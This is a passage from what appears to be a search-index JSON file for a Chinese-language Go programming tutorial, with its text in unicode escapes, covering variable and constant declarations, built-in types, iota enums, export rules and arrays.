<p>\u6700\u540e\u5927\u5bb6\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u8f93\u51fa\u7684\u5185\u5bb9\u91cc\u9762\u5305\u542b\u4e86\u5f88\u591a\u975eASCII\u7801\u5b57\u7b26\u3002\u5b9e\u9645\u4e0a\uff0cGo\u662f\u5929\u751f\u652f\u6301UTF-8\u7684\uff0c\u4efb\u4f55\u5b57\u7b26\u90fd\u53ef\u4ee5\u76f4\u63a5\u8f93\u51fa\uff0c\u4f60\u751a\u81f3\u53ef\u4ee5\u7528UTF-8\u4e2d\u7684\u4efb\u4f55\u5b57\u7b26\u4f5c\u4e3a\u6807\u8bc6\u7b26\u3002</p>"},{"location":"02.1/#_3","title":"\u7ed3\u8bba","text":"<p>Go\u4f7f\u7528<code>package</code>\uff08\u548cPython\u7684\u6a21\u5757\u7c7b\u4f3c\uff09\u6765\u7ec4\u7ec7\u4ee3\u7801\u3002<code>main.main()</code>\u51fd\u6570(\u8fd9\u4e2a\u51fd\u6570\u4f4d\u4e8e\u4e3b\u5305\uff09\u662f\u6bcf\u4e00\u4e2a\u72ec\u7acb\u7684\u53ef\u8fd0\u884c\u7a0b\u5e8f\u7684\u5165\u53e3\u70b9\u3002Go\u4f7f\u7528UTF-8\u5b57\u7b26\u4e32\u548c\u6807\u8bc6\u7b26(\u56e0\u4e3aUTF-8\u7684\u53d1\u660e\u8005\u4e5f\u5c31\u662fGo\u7684\u53d1\u660e\u8005\u4e4b\u4e00)\uff0c\u6240\u4ee5\u5b83\u5929\u751f\u652f\u6301\u591a\u8bed\u8a00\u3002</p>"},{"location":"02.1/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: Go\u8bed\u8a00\u57fa\u7840</li> <li>\u4e0b\u4e00\u8282: Go\u57fa\u7840</li> </ul>"},{"location":"02.2/","title":"2.2 Go\u57fa\u7840","text":"<p>\u8fd9\u5c0f\u8282\u6211\u4eec\u5c06\u8981\u4ecb\u7ecd\u5982\u4f55\u5b9a\u4e49\u53d8\u91cf\u3001\u5e38\u91cf\u3001Go\u5185\u7f6e\u7c7b\u578b\u4ee5\u53caGo\u7a0b\u5e8f\u8bbe\u8ba1\u4e2d\u7684\u4e00\u4e9b\u6280\u5de7\u3002</p>"},{"location":"02.2/#_1","title":"\u5b9a\u4e49\u53d8\u91cf","text":"<p>Go\u8bed\u8a00\u91cc\u9762\u5b9a\u4e49\u53d8\u91cf\u6709\u591a\u79cd\u65b9\u5f0f\u3002</p> <p>\u4f7f\u7528<code>var</code>\u5173\u952e\u5b57\u662fGo\u6700\u57fa\u672c\u7684\u5b9a\u4e49\u53d8\u91cf\u65b9\u5f0f\uff0c\u4e0eC\u8bed\u8a00\u4e0d\u540c\u7684\u662fGo\u628a\u53d8\u91cf\u7c7b\u578b\u653e\u5728\u53d8\u91cf\u540d\u540e\u9762\uff1a <pre><code>//\u5b9a\u4e49\u4e00\u4e2a\u540d\u79f0\u4e3a\u201cvariableName\u201d\uff0c\u7c7b\u578b\u4e3a\"type\"\u7684\u53d8\u91cf\nvar variableName type\n</code></pre> \u5b9a\u4e49\u591a\u4e2a\u53d8\u91cf <pre><code>//\u5b9a\u4e49\u4e09\u4e2a\u7c7b\u578b\u90fd\u662f\u201ctype\u201d\u7684\u53d8\u91cf\nvar vname1, vname2, vname3 type\n</code></pre> \u5b9a\u4e49\u53d8\u91cf\u5e76\u521d\u59cb\u5316\u503c <pre><code>//\u521d\u59cb\u5316\u201cvariableName\u201d\u7684\u53d8\u91cf\u4e3a\u201cvalue\u201d\u503c\uff0c\u7c7b\u578b\u662f\u201ctype\u201d\nvar variableName type = value\n</code></pre> \u540c\u65f6\u521d\u59cb\u5316\u591a\u4e2a\u53d8\u91cf <pre><code>/*\n    \u5b9a\u4e49\u4e09\u4e2a\u7c7b\u578b\u90fd\u662f\"type\"\u7684\u53d8\u91cf,\u5e76\u4e14\u5206\u522b\u521d\u59cb\u5316\u4e3a\u76f8\u5e94\u7684\u503c\n    vname1\u4e3av1\uff0cvname2\u4e3av2\uff0cvname3\u4e3av3\n*/\nvar vname1, vname2, vname3 type= v1, v2, v3\n</code></pre> \u4f60\u662f\u4e0d\u662f\u89c9\u5f97\u4e0a\u9762\u8fd9\u6837\u7684\u5b9a\u4e49\u6709\u70b9\u7e41\u7410\uff1f\u6ca1\u5173\u7cfb\uff0c\u56e0\u4e3aGo\u8bed\u8a00\u7684\u8bbe\u8ba1\u8005\u4e5f\u53d1\u73b0\u4e86\uff0c\u6709\u4e00\u79cd\u5199\u6cd5\u53ef\u4ee5\u8ba9\u5b83\u53d8\u5f97\u7b80\u5355\u4e00\u70b9\u3002\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u5ffd\u7565\u7c7b\u578b\u58f0\u660e\uff0c\u90a3\u4e48\u4e0a\u9762\u7684\u4ee3\u7801\u53d8\u6210\u8fd9\u6837\u4e86\uff1a <pre><code>/*\n    \u5b9a\u4e49\u4e09\u4e2a\u53d8\u91cf\uff0c\u5b83\u4eec\u5206\u522b\u521d\u59cb\u5316\u4e3a\u76f8\u5e94\u7684\u503c\n    vname1\u4e3av1\uff0cvname2\u4e3av2\uff0cvname3\u4e3av3\n    \u7136\u540eGo\u4f1a\u6839\u636e\u5176\u76f8\u5e94\u503c\u7684\u7c7b\u578b\u6765\u5e2e\u4f60\u521d\u59cb\u5316\u5b83\u4eec\n*/\nvar vname1, vname2, vname3 = v1, v2, v3\n</code></pre> \u4f60\u89c9\u5f97\u4e0a\u9762\u7684\u8fd8\u662f\u6709\u4e9b\u7e41\u7410\uff1f\u597d\u5427\uff0c\u6211\u4e5f\u89c9\u5f97\u3002\u8ba9\u6211\u4eec\u7ee7\u7eed\u7b80\u5316\uff1a <pre><code>/*\n    \u5b9a\u4e49\u4e09\u4e2a\u53d8\u91cf\uff0c\u5b83\u4eec\u5206\u522b\u521d\u59cb\u5316\u4e3a\u76f8\u5e94\u7684\u503c\n    vname1\u4e3av1\uff0cvname2\u4e3av2\uff0cvname3\u4e3av3\n    \u7f16\u8bd1\u5668\u4f1a\u6839\u636e\u521d\u59cb\u5316\u7684\u503c\u81ea\u52a8\u63a8\u5bfc\u51fa\u76f8\u5e94\u7684\u7c7b\u578b\n*/\nvname1, vname2, vname3 := v1, v2, v3\n</code></pre> \u73b0\u5728\u662f\u4e0d\u662f\u770b\u4e0a\u53bb\u975e\u5e38\u7b80\u6d01\u4e86\uff1f<code>:=</code>\u8fd9\u4e2a\u7b26\u53f7\u76f4\u63a5\u53d6\u4ee3\u4e86<code>var</code>\u548c<code>type</code>,\u8fd9\u79cd\u5f62\u5f0f\u53eb\u505a\u7b80\u77ed\u58f0\u660e\u3002\u4e0d\u8fc7\u5b83\u6709\u4e00\u4e2a\u9650\u5236\uff0c\u90a3\u5c31\u662f\u5b83\u53ea\u80fd\u7528\u5728\u51fd\u6570\u5185\u90e8\uff1b\u5728\u51fd\u6570\u5916\u90e8\u4f7f\u7528\u5219\u4f1a\u65e0\u6cd5\u7f16\u8bd1\u901a\u8fc7\uff0c\u6240\u4ee5\u4e00\u822c\u7528<code>var</code>\u65b9\u5f0f\u6765\u5b9a\u4e49\u5168\u5c40\u53d8\u91cf\u3002</p> <p><code>_</code>\uff08\u4e0b\u5212\u7ebf\uff09\u662f\u4e2a\u7279\u6b8a\u7684\u53d8\u91cf\u540d\uff0c\u4efb\u4f55\u8d4b\u4e88\u5b83\u7684\u503c\u90fd\u4f1a\u88ab\u4e22\u5f03\u3002\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u5c06\u503c<code>35</code>\u8d4b\u4e88<code>b</code>\uff0c\u5e76\u540c\u65f6\u4e22\u5f03<code>34</code>\uff1a</p> <pre><code>_, b := 34, 35\n</code></pre> <p>Go\u5bf9\u4e8e\u5df2\u58f0\u660e\u4f46\u672a\u4f7f\u7528\u7684\u53d8\u91cf\u4f1a\u5728\u7f16\u8bd1\u9636\u6bb5\u62a5\u9519\uff0c\u6bd4\u5982\u4e0b\u9762\u7684\u4ee3\u7801\u5c31\u4f1a\u4ea7\u751f\u4e00\u4e2a\u9519\u8bef\uff1a\u58f0\u660e\u4e86<code>i</code>\u4f46\u672a\u4f7f\u7528\u3002 <pre><code>package main\n\nfunc main() {\nvar i int\n}\n</code></pre></p>"},{"location":"02.2/#_2","title":"\u5e38\u91cf","text":"<p>\u6240\u8c13\u5e38\u91cf\uff0c\u4e5f\u5c31\u662f\u5728\u7a0b\u5e8f\u7f16\u8bd1\u9636\u6bb5\u5c31\u786e\u5b9a\u4e0b\u6765\u7684\u503c\uff0c\u800c\u7a0b\u5e8f\u5728\u8fd0\u884c\u65f6\u65e0\u6cd5\u6539\u53d8\u8be5\u503c\u3002\u5728Go\u7a0b\u5e8f\u4e2d\uff0c\u5e38\u91cf\u53ef\u5b9a\u4e49\u4e3a\u6570\u503c\u3001\u5e03\u5c14\u503c\u6216\u5b57\u7b26\u4e32\u7b49\u7c7b\u578b\u3002</p> <p>\u5b83\u7684\u8bed\u6cd5\u5982\u4e0b\uff1a <pre><code>const constantName = value\n//\u5982\u679c\u9700\u8981\uff0c\u4e5f\u53ef\u4ee5\u660e\u786e\u6307\u5b9a\u5e38\u91cf\u7684\u7c7b\u578b\uff1a\nconst Pi float32 = 3.1415926\n</code></pre> \u4e0b\u9762\u662f\u4e00\u4e9b\u5e38\u91cf\u58f0\u660e\u7684\u4f8b\u5b50\uff1a <pre><code>const Pi = 3.1415926\nconst i = 10000\nconst MaxThread = 10\nconst prefix = \"astaxie_\"\n</code></pre> Go \u5e38\u91cf\u548c\u4e00\u822c\u7a0b\u5e8f\u8bed\u8a00\u4e0d\u540c\u7684\u662f\uff0c\u53ef\u4ee5\u6307\u5b9a\u76f8\u5f53\u591a\u7684\u5c0f\u6570\u4f4d\u6570(\u4f8b\u5982200\u4f4d)\uff0c \u82e5\u6307\u5b9a\u7d66float32\u81ea\u52a8\u7f29\u77ed\u4e3a32bit\uff0c\u6307\u5b9a\u7ed9float64\u81ea\u52a8\u7f29\u77ed\u4e3a64bit\uff0c\u8be6\u60c5\u53c2\u8003\u94fe\u63a5</p>"},{"location":"02.2/#_3","title":"\u5185\u7f6e\u57fa\u7840\u7c7b\u578b","text":""},{"location":"02.2/#boolean","title":"Boolean","text":"<p>\u5728Go\u4e2d\uff0c\u5e03\u5c14\u503c\u7684\u7c7b\u578b\u4e3a<code>bool</code>\uff0c\u503c\u662f<code>true</code>\u6216<code>false</code>\uff0c\u9ed8\u8ba4\u4e3a<code>false</code>\u3002 <pre><code>//\u793a\u4f8b\u4ee3\u7801\nvar isActive bool  // \u5168\u5c40\u53d8\u91cf\u58f0\u660e\nvar enabled, disabled = true, false  // \u5ffd\u7565\u7c7b\u578b\u7684\u58f0\u660e\nfunc test() {\nvar available bool  // \u4e00\u822c\u58f0\u660e\nvalid := false      // \u7b80\u77ed\u58f0\u660e\navailable = true    // \u8d4b\u503c\u64cd\u4f5c\n}\n</code></pre></p>"},{"location":"02.2/#_4","title":"\u6570\u503c\u7c7b\u578b","text":"<p>\u6574\u6570\u7c7b\u578b\u6709\u65e0\u7b26\u53f7\u548c\u5e26\u7b26\u53f7\u4e24\u79cd\u3002Go\u540c\u65f6\u652f\u6301<code>int</code>\u548c<code>uint</code>\uff0c\u8fd9\u4e24\u79cd\u7c7b\u578b\u7684\u957f\u5ea6\u76f8\u540c\uff0c\u4f46\u5177\u4f53\u957f\u5ea6\u53d6\u51b3\u4e8e\u4e0d\u540c\u7f16\u8bd1\u5668\u7684\u5b9e\u73b0\u3002Go\u91cc\u9762\u4e5f\u6709\u76f4\u63a5\u5b9a\u4e49\u597d\u4f4d\u6570\u7684\u7c7b\u578b\uff1a<code>rune</code>, <code>int8</code>, <code>int16</code>, <code>int32</code>, <code>int64</code>\u548c<code>byte</code>, <code>uint8</code>, <code>uint16</code>, <code>uint32</code>, <code>uint64</code>\u3002\u5176\u4e2d<code>rune</code>\u662f<code>int32</code>\u7684\u522b\u79f0\uff0c<code>byte</code>\u662f<code>uint8</code>\u7684\u522b\u79f0\u3002</p> <p>\u9700\u8981\u6ce8\u610f\u7684\u4e00\u70b9\u662f\uff0c\u8fd9\u4e9b\u7c7b\u578b\u7684\u53d8\u91cf\u4e4b\u95f4\u4e0d\u5141\u8bb8\u4e92\u76f8\u8d4b\u503c\u6216\u64cd\u4f5c\uff0c\u4e0d\u7136\u4f1a\u5728\u7f16\u8bd1\u65f6\u5f15\u8d77\u7f16\u8bd1\u5668\u62a5\u9519\u3002</p> <p>\u5982\u4e0b\u7684\u4ee3\u7801\u4f1a\u4ea7\u751f\u9519\u8bef\uff1ainvalid operation: a + b (mismatched types int8 and int32)</p> <p>var a int8</p> <p>var b int32</p> <p>c:=a + b</p> <p>\u53e6\u5916\uff0c\u5c3d\u7ba1int\u7684\u957f\u5ea6\u662f32 bit, \u4f46int \u4e0e int32\u5e76\u4e0d\u53ef\u4ee5\u4e92\u7528\u3002</p> <p>\u6d6e\u70b9\u6570\u7684\u7c7b\u578b\u6709<code>float32</code>\u548c<code>float64</code>\u4e24\u79cd\uff08\u6ca1\u6709<code>float</code>\u7c7b\u578b\uff09\uff0c\u9ed8\u8ba4\u662f<code>float64</code>\u3002</p> <p>\u8fd9\u5c31\u662f\u5168\u90e8\u5417\uff1fNo\uff01Go\u8fd8\u652f\u6301\u590d\u6570\u3002\u5b83\u7684\u9ed8\u8ba4\u7c7b\u578b\u662f<code>complex128</code>\uff0864\u4f4d\u5b9e\u6570+64\u4f4d\u865a\u6570\uff09\u3002\u5982\u679c\u9700\u8981\u5c0f\u4e00\u4e9b\u7684\uff0c\u4e5f\u6709<code>complex64</code>(32\u4f4d\u5b9e\u6570+32\u4f4d\u865a\u6570)\u3002\u590d\u6570\u7684\u5f62\u5f0f\u4e3a<code>RE + IMi</code>\uff0c\u5176\u4e2d<code>RE</code>\u662f\u5b9e\u6570\u90e8\u5206\uff0c<code>IM</code>\u662f\u865a\u6570\u90e8\u5206\uff0c\u800c\u6700\u540e\u7684<code>i</code>\u662f\u865a\u6570\u5355\u4f4d\u3002\u4e0b\u9762\u662f\u4e00\u4e2a\u4f7f\u7528\u590d\u6570\u7684\u4f8b\u5b50\uff1a <pre><code>var c complex64 = 5+5i\n//output: (5+5i)\nfmt.Printf(\"Value is: %v\", c)\n</code></pre></p>"},{"location":"02.2/#_5","title":"\u5b57\u7b26\u4e32","text":"<p>\u6211\u4eec\u5728\u4e0a\u4e00\u8282\u4e2d\u8bb2\u8fc7\uff0cGo\u4e2d\u7684\u5b57\u7b26\u4e32\u90fd\u662f\u91c7\u7528<code>UTF-8</code>\u5b57\u7b26\u96c6\u7f16\u7801\u3002\u5b57\u7b26\u4e32\u662f\u7528\u4e00\u5bf9\u53cc\u5f15\u53f7\uff08<code>\"\"</code>\uff09\u6216\u53cd\u5f15\u53f7\uff08<code>`</code> <code>`</code>\uff09\u62ec\u8d77\u6765\u5b9a\u4e49\uff0c\u5b83\u7684\u7c7b\u578b\u662f<code>string</code>\u3002 <pre><code>//\u793a\u4f8b\u4ee3\u7801\nvar frenchHello string  // \u58f0\u660e\u53d8\u91cf\u4e3a\u5b57\u7b26\u4e32\u7684\u4e00\u822c\u65b9\u6cd5\nvar emptyString string = \"\"  // \u58f0\u660e\u4e86\u4e00\u4e2a\u5b57\u7b26\u4e32\u53d8\u91cf\uff0c\u521d\u59cb\u5316\u4e3a\u7a7a\u5b57\u7b26\u4e32\nfunc test() {\nno, yes, maybe := \"no\", \"yes\", \"maybe\"  // \u7b80\u77ed\u58f0\u660e\uff0c\u540c\u65f6\u58f0\u660e\u591a\u4e2a\u53d8\u91cf\njapaneseHello := \"Konichiwa\"  // \u540c\u4e0a\nfrenchHello = \"Bonjour\"  // \u5e38\u89c4\u8d4b\u503c\n}\n</code></pre> \u5728Go\u4e2d\u5b57\u7b26\u4e32\u662f\u4e0d\u53ef\u53d8\u7684\uff0c\u4f8b\u5982\u4e0b\u9762\u7684\u4ee3\u7801\u7f16\u8bd1\u65f6\u4f1a\u62a5\u9519\uff1acannot assign to s[0] <pre><code>var s string = \"hello\"\ns[0] = 'c'\n</code></pre> \u4f46\u5982\u679c\u771f\u7684\u60f3\u8981\u4fee\u6539\u600e\u4e48\u529e\u5462\uff1f\u4e0b\u9762\u7684\u4ee3\u7801\u53ef\u4ee5\u5b9e\u73b0\uff1a <pre><code>s := \"hello\"\nc := []byte(s)  // \u5c06\u5b57\u7b26\u4e32 s \u8f6c\u6362\u4e3a []byte \u7c7b\u578b\nc[0] = 'c'\ns2 := string(c)  // \u518d\u8f6c\u6362\u56de string \u7c7b\u578b\nfmt.Printf(\"%s\\n\", s2)\n</code></pre></p> <p>Go\u4e2d\u53ef\u4ee5\u4f7f\u7528<code>+</code>\u64cd\u4f5c\u7b26\u6765\u8fde\u63a5\u4e24\u4e2a\u5b57\u7b26\u4e32\uff1a <pre><code>s := \"hello,\"\nm := \" world\"\na := s + m\nfmt.Printf(\"%s\\n\", a)\n</code></pre> \u4fee\u6539\u5b57\u7b26\u4e32\u4e5f\u53ef\u5199\u4e3a\uff1a <pre><code>s := \"hello\"\ns = \"c\" + s[1:] // \u5b57\u7b26\u4e32\u867d\u4e0d\u80fd\u66f4\u6539\uff0c\u4f46\u53ef\u8fdb\u884c\u5207\u7247\u64cd\u4f5c\nfmt.Printf(\"%s\\n\", s)\n</code></pre> \u5982\u679c\u8981\u58f0\u660e\u4e00\u4e2a\u591a\u884c\u7684\u5b57\u7b26\u4e32\u600e\u4e48\u529e\uff1f\u53ef\u4ee5\u901a\u8fc7<code>`</code>\u6765\u58f0\u660e\uff1a</p> <pre><code>m := `hello\n    world`\n</code></pre> <p><code>`</code> \u62ec\u8d77\u7684\u5b57\u7b26\u4e32\u4e3aRaw\u5b57\u7b26\u4e32\uff0c\u5373\u5b57\u7b26\u4e32\u5728\u4ee3\u7801\u4e2d\u7684\u5f62\u5f0f\u5c31\u662f\u6253\u5370\u65f6\u7684\u5f62\u5f0f\uff0c\u5b83\u6ca1\u6709\u5b57\u7b26\u8f6c\u4e49\uff0c\u6362\u884c\u4e5f\u5c06\u539f\u6837\u8f93\u51fa\u3002\u4f8b\u5982\u672c\u4f8b\u4e2d\u4f1a\u8f93\u51fa\uff1a</p> <pre><code>hello\n    world\n</code></pre>"},{"location":"02.2/#_6","title":"\u9519\u8bef\u7c7b\u578b","text":"<p>Go\u5185\u7f6e\u6709\u4e00\u4e2a<code>error</code>\u7c7b\u578b\uff0c\u4e13\u95e8\u7528\u6765\u5904\u7406\u9519\u8bef\u4fe1\u606f\uff0cGo\u7684<code>package</code>\u91cc\u9762\u8fd8\u4e13\u95e8\u6709\u4e00\u4e2a\u5305<code>errors</code>\u6765\u5904\u7406\u9519\u8bef\uff1a <pre><code>err := errors.New(\"emit macho dwarf: elf header corrupted\")\nif err != nil {\nfmt.Print(err)\n}\n</code></pre></p>"},{"location":"02.2/#go","title":"Go\u6570\u636e\u5e95\u5c42\u7684\u5b58\u50a8","text":"<p>\u4e0b\u9762\u8fd9\u5f20\u56fe\u6765\u6e90\u4e8eRuss Cox Blog\u4e2d\u4e00\u7bc7\u4ecb\u7ecdGo\u6570\u636e\u7ed3\u6784\u7684\u6587\u7ae0\uff0c\u5927\u5bb6\u53ef\u4ee5\u770b\u5230\u8fd9\u4e9b\u57fa\u7840\u7c7b\u578b\u5e95\u5c42\u90fd\u662f\u5206\u914d\u4e86\u4e00\u5757\u5185\u5b58\uff0c\u7136\u540e\u5b58\u50a8\u4e86\u76f8\u5e94\u7684\u503c\u3002</p> <p></p> <p>\u56fe2.1 Go\u6570\u636e\u683c\u5f0f\u7684\u5b58\u50a8</p>"},{"location":"02.2/#_7","title":"\u4e00\u4e9b\u6280\u5de7","text":""},{"location":"02.2/#_8","title":"\u5206\u7ec4\u58f0\u660e","text":"<p>\u5728Go\u8bed\u8a00\u4e2d\uff0c\u540c\u65f6\u58f0\u660e\u591a\u4e2a\u5e38\u91cf\u3001\u53d8\u91cf\uff0c\u6216\u8005\u5bfc\u5165\u591a\u4e2a\u5305\u65f6\uff0c\u53ef\u91c7\u7528\u5206\u7ec4\u7684\u65b9\u5f0f\u8fdb\u884c\u58f0\u660e\u3002</p> <p>\u4f8b\u5982\u4e0b\u9762\u7684\u4ee3\u7801\uff1a <pre><code>import \"fmt\"\nimport \"os\"\n\nconst i = 100\nconst pi = 3.1415\nconst prefix = \"Go_\"\n\nvar i int\nvar pi float32\nvar prefix string\n</code></pre> \u53ef\u4ee5\u5206\u7ec4\u5199\u6210\u5982\u4e0b\u5f62\u5f0f\uff1a <pre><code>import(\n\"fmt\"\n\"os\"\n)\n\nconst(\ni = 100\npi = 3.1415\nprefix = \"Go_\"\n)\n\nvar(\ni int\npi float32\nprefix string\n)\n</code></pre></p>"},{"location":"02.2/#iota","title":"iota\u679a\u4e3e","text":"<p>Go\u91cc\u9762\u6709\u4e00\u4e2a\u5173\u952e\u5b57<code>iota</code>\uff0c\u8fd9\u4e2a\u5173\u952e\u5b57\u7528\u6765\u58f0\u660e<code>enum</code>\u7684\u65f6\u5019\u91c7\u7528\uff0c\u5b83\u9ed8\u8ba4\u5f00\u59cb\u503c\u662f0\uff0cconst\u4e2d\u6bcf\u589e\u52a0\u4e00\u884c\u52a01\uff1a <pre><code>package main\n\nimport (\n\"fmt\"\n)\n\nconst (\nx = iota // x == 0\ny = iota // y == 1\nz = iota // z == 2\nw        // \u5e38\u91cf\u58f0\u660e\u7701\u7565\u503c\u65f6\uff0c\u9ed8\u8ba4\u548c\u4e4b\u524d\u4e00\u4e2a\u503c\u7684\u5b57\u9762\u76f8\u540c\u3002\u8fd9\u91cc\u9690\u5f0f\u5730\u8bf4w = iota\uff0c\u56e0\u6b64w == 3\u3002\u5176\u5b9e\u4e0a\u9762y\u548cz\u53ef\u540c\u6837\u4e0d\u7528\"= iota\"\n)\n\nconst v = iota // \u6bcf\u9047\u5230\u4e00\u4e2aconst\u5173\u952e\u5b57\uff0ciota\u5c31\u4f1a\u91cd\u7f6e\uff0c\u6b64\u65f6v == 0\n\nconst (\nh, i, j = iota, iota, iota //h=0,i=0,j=0 iota\u5728\u540c\u4e00\u884c\u503c\u76f8\u540c\n)\n\nconst (\na       = iota //a=0\nb       = \"B\"\nc       = iota             //c=2\nd, e, f = iota, iota, iota //d=3,e=3,f=3\ng       = iota             //g = 4\n)\n\nfunc main() {\nfmt.Println(a, b, c, d, e, f, g, h, i, j, x, y, z, w, v)\n}\n</code></pre></p> <p>\u9664\u975e\u88ab\u663e\u5f0f\u8bbe\u7f6e\u4e3a\u5176\u5b83\u503c\u6216<code>iota</code>\uff0c\u6bcf\u4e2a<code>const</code>\u5206\u7ec4\u7684\u7b2c\u4e00\u4e2a\u5e38\u91cf\u88ab\u9ed8\u8ba4\u8bbe\u7f6e\u4e3a\u5b83\u76840\u503c\uff0c\u7b2c\u4e8c\u53ca\u540e\u7eed\u7684\u5e38\u91cf\u88ab\u9ed8\u8ba4\u8bbe\u7f6e\u4e3a\u5b83\u524d\u9762\u90a3\u4e2a\u5e38\u91cf\u7684\u503c\uff0c\u5982\u679c\u524d\u9762\u90a3\u4e2a\u5e38\u91cf\u7684\u503c\u662f<code>iota</code>\uff0c\u5219\u5b83\u4e5f\u88ab\u8bbe\u7f6e\u4e3a<code>iota</code>\u3002</p>"},{"location":"02.2/#go_1","title":"Go\u7a0b\u5e8f\u8bbe\u8ba1\u7684\u4e00\u4e9b\u89c4\u5219","text":"<p>Go\u4e4b\u6240\u4ee5\u4f1a\u90a3\u4e48\u7b80\u6d01\uff0c\u662f\u56e0\u4e3a\u5b83\u6709\u4e00\u4e9b\u9ed8\u8ba4\u7684\u884c\u4e3a\uff1a - \u5927\u5199\u5b57\u6bcd\u5f00\u5934\u7684\u53d8\u91cf\u662f\u53ef\u5bfc\u51fa\u7684\uff0c\u4e5f\u5c31\u662f\u5176\u5b83\u5305\u53ef\u4ee5\u8bfb\u53d6\u7684\uff0c\u662f\u516c\u6709\u53d8\u91cf\uff1b\u5c0f\u5199\u5b57\u6bcd\u5f00\u5934\u7684\u5c31\u662f\u4e0d\u53ef\u5bfc\u51fa\u7684\uff0c\u662f\u79c1\u6709\u53d8\u91cf\u3002 - \u5927\u5199\u5b57\u6bcd\u5f00\u5934\u7684\u51fd\u6570\u4e5f\u662f\u4e00\u6837\uff0c\u76f8\u5f53\u4e8e<code>class</code>\u4e2d\u7684\u5e26<code>public</code>\u5173\u952e\u8bcd\u7684\u516c\u6709\u51fd\u6570\uff1b\u5c0f\u5199\u5b57\u6bcd\u5f00\u5934\u7684\u5c31\u662f\u6709<code>private</code>\u5173\u952e\u8bcd\u7684\u79c1\u6709\u51fd\u6570\u3002</p>"},{"location":"02.2/#arrayslicemap","title":"array\u3001slice\u3001map","text":""},{"location":"02.2/#array","title":"array","text":"<p><code>array</code>\u5c31\u662f\u6570\u7ec4\uff0c\u5b83\u7684\u5b9a\u4e49\u65b9\u5f0f\u5982\u4e0b\uff1a <pre><code>var arr [n]type\n</code></pre> \u5728<code>[n]type</code>\u4e2d\uff0c<code>n</code>\u8868\u793a\u6570\u7ec4\u7684\u957f\u5ea6\uff0c<code>type</code>\u8868\u793a\u5b58\u50a8\u5143\u7d20\u7684\u7c7b\u578b\u3002\u5bf9\u6570\u7ec4\u7684\u64cd\u4f5c\u548c\u5176\u5b83\u8bed\u8a00\u7c7b\u4f3c\uff0c\u90fd\u662f\u901a\u8fc7<code>[]</code>\u6765\u8fdb\u884c\u8bfb\u53d6\u6216\u8d4b\u503c\uff1a <pre><code>var arr [10]int  // \u58f0\u660e\u4e86\u4e00\u4e2aint\u7c7b\u578b\u7684\u6570\u7ec4\narr[0] = 42      // \u6570\u7ec4\u4e0b\u6807\u662f\u4ece0\u5f00\u59cb\u7684\narr[1] = 13      // \u8d4b\u503c\u64cd\u4f5c\nfmt.Printf(\"The first element is %d\\n\", arr[0])  // \u83b7\u53d6\u6570\u636e\uff0c\u8fd4\u56de42\nfmt.Printf(\"The last element is %d\\n\", arr[9]) //\u8fd4\u56de\u672a\u8d4b\u503c\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\uff0c\u9ed8\u8ba4\u8fd4\u56de0\n</code></pre> \u7531\u4e8e\u957f\u5ea6\u4e5f\u662f\u6570\u7ec4\u7c7b\u578b\u7684\u4e00\u90e8\u5206\uff0c\u56e0\u6b64<code>[3]int</code>\u4e0e<code>[4]int</code>\u662f\u4e0d\u540c\u7684\u7c7b\u578b\uff0c\u6570\u7ec4\u4e5f\u5c31\u4e0d\u80fd\u6539\u53d8\u957f\u5ea6\u3002\u6570\u7ec4\u4e4b\u95f4\u7684\u8d4b\u503c\u662f\u503c\u7684\u8d4b\u503c\uff0c\u5373\u5f53\u628a\u4e00\u4e2a\u6570\u7ec4\u4f5c\u4e3a\u53c2\u6570\u4f20\u5165\u51fd\u6570\u7684\u65f6\u5019\uff0c\u4f20\u5165\u7684\u5176\u5b9e\u662f\u8be5\u6570\u7ec4\u7684\u526f\u672c\uff0c\u800c\u4e0d\u662f\u5b83\u7684\u6307\u9488\u3002\u5982\u679c\u8981\u4f7f\u7528\u6307\u9488\uff0c\u90a3\u4e48\u5c31\u9700\u8981\u7528\u5230\u540e\u9762\u4ecb\u7ecd\u7684<code>slice</code>\u7c7b\u578b\u4e86\u3002</p> <p>\u6570\u7ec4\u53ef\u4ee5\u4f7f\u7528\u53e6\u4e00\u79cd<code>:=</code>\u6765\u58f0\u660e <pre><code>a := [3]int{1, 2, 3} // \u58f0\u660e\u4e86\u4e00\u4e2a\u957f\u5ea6\u4e3a3\u7684int\u6570\u7ec4\n\nb := [10]int{1, 2, 3} // \u58f0\u660e\u4e86\u4e00\u4e2a\u957f\u5ea6\u4e3a10\u7684int\u6570\u7ec4\uff0c\u5176\u4e2d\u524d\u4e09\u4e2a\u5143\u7d20\u521d\u59cb\u5316\u4e3a1\u30012\u30013\uff0c\u5176\u5b83\u9ed8\u8ba4\u4e3a0\n\nc := [...]int{4, 5, 6} // \u53ef\u4ee5\u7701\u7565\u957f\u5ea6\u800c\u91c7\u7528`...`\u7684\u65b9\u5f0f\uff0cGo\u4f1a\u81ea\u52a8\u6839\u636e\u5143\u7d20\u4e2a\u6570\u6765\u8ba1\u7b97\u957f\u5ea6\n</code></pre> \u4e5f\u8bb8\u4f60\u4f1a\u8bf4\uff0c\u6211\u60f3\u6570\u7ec4\u91cc\u9762\u7684\u503c\u8fd8\u662f\u6570\u7ec4\uff0c\u80fd\u5b9e\u73b0\u5417\uff1f\u5f53\u7136\u54af\uff0cGo\u652f\u6301\u5d4c\u5957\u6570\u7ec4\uff0c\u5373\u591a\u7ef4\u6570\u7ec4\u3002\u6bd4\u5982\u4e0b\u9762\u7684\u4ee3\u7801\u5c31\u58f0\u660e\u4e86\u4e00\u4e2a\u4e8c\u7ef4\u6570\u7ec4\uff1a <pre><code>// \u58f0\u660e\u4e86\u4e00\u4e2a\u4e8c\u7ef4\u6570\u7ec4\uff0c\u8be5\u6570\u7ec4\u4ee5\u4e24\u4e2a\u6570\u7ec4\u4f5c\u4e3a\u5143\u7d20\uff0c\u5176\u4e2d\u6bcf\u4e2a\u6570\u7ec4\u4e2d\u53c8\u67094\u4e2aint\u7c7b\u578b\u7684\u5143\u7d20\ndoubleArray := [2][4]int{[4]int{1, 2, 3, 4}, [4]int{5, 6, 7, 8}}\n\n// \u4e0a\u9762\u7684\u58f0\u660e\u53ef\u4ee5\u7b80\u5316\uff0c\u76f4\u63a5\u5ffd\u7565\u5185\u90e8\u7684\u7c7b\u578b\neasyArray := [2][4]int{{1, 2, 3, 4}, 